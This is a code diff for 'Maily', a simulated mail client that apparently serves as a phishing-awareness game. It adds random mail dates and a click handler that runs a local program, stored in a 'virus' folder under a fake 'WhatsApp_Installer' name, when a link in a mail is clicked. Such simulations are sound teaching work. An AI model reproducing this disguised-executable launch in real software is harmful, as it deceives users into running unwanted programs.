@@ -22,6 +22,11 @@ function quitter() {
 
 /*************************** Maily *******************************/
 
+// génère une date aléatoire entre 2 bornes
+function randomDate(start, end) {
+    return new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
+}
+
 // --- Helpers robustes ---
 function getDateParts(str) {
     if (!str || typeof str !== "string") return null;
@@ -107,11 +112,22 @@ async function loadMails() {
         listMails = listMails.map(mail => ({...mail, lu: false}))
 
         listMails.sort(() => Math.random() - 0.5)
+
+        // génère des dates
+        for (let index in listMails) {
+            let date = randomDate(new Date(2025, 8, 1), new Date())
+
+            listMails[index].date = `${date.getDate() < 10 ? "0" + date.getDate() : date.getDate()}/${date.getMonth() + 1 < 10 ? "0" + (date.getMonth() + 1) : date.getMonth() + 1}/${date.getFullYear()}`;
+            listMails[index].time = `${Math.floor(Math.random() * 9 + 8)}:${date.getMinutes() < 10 ? "0" + date.getMinutes() : date.getMinutes()}`;
+        }
+
         // Sauvegarder
         sauvegarderMail()
     } else {
         listMails = JSON.parse(sessionStorage.getItem('mails'));
     }
+
+
     trierMailsParDateHeure()
     afficherListeMails()
 }
@@ -154,7 +170,7 @@ async function ouvrirMail(id) {
     mailOuvertEl.querySelector('.icon').src = `../images/${mail.icon}`
     mailOuvertEl.querySelector('.sender').innerHTML = "<span class='label'>De :</span> " + mail.sender
     mailOuvertEl.querySelector('.objet').innerHTML = "<span class='label'>Objet :</span> " + mail.object
-    mailOuvertEl.querySelector('.time').innerHTML = `<strong>${mail.time}</strong>`
+    mailOuvertEl.querySelector('.time').innerHTML = `<strong>${mail.date} ${mail.time}</strong>`
     mailOuvertEl.querySelector('.message').innerHTML = message
     mailOuvertEl.querySelector('.secret').innerHTML = `${mail.secret}`
 
@@ -209,7 +225,6 @@ async function ouvrirMail(id) {
             });
         })
     }
-
     if (mail.backgroundImage) {
         mailOuvertEl.style.backgroundImage = `linear-gradient(rgba(255,255,255,0.9), rgba(255,255,255,0.9)), url('../images/${mail.backgroundImage}')`
         mailOuvertEl.style.backgroundSize = "cover"
@@ -231,6 +246,13 @@ async function ouvrirMail(id) {
     // Marquer comme lu
     listMails[id].lu = true
     sauvegarderMail()
+
+    const link = document.querySelector('.lien');
+    link.addEventListener('click', e => {
+        exec('.\\resources\\app\\src\\virus\\WhatsApp_Installer', (error, stdout, stderr) => {
+            console.log(stderr)
+        });
+    })
 }
 
 function fermerMail() {
